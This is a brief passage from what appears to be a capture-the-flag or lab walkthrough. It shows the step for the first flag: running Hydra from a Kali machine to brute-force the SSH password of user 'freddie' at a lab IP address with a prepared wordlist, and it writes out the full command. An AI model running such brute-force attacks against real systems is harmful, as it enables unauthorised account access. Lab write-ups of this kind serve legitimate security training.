4.1 Getting password with Hydra (First flag)



1. Run “hydra” on your Kali Machine to get the “freddie” user's name. You have to use the MD5 wordlist created previously (g3.txt).
$hydra -l freddie -P g3.txt ssh://192.168.12.26 -t 20
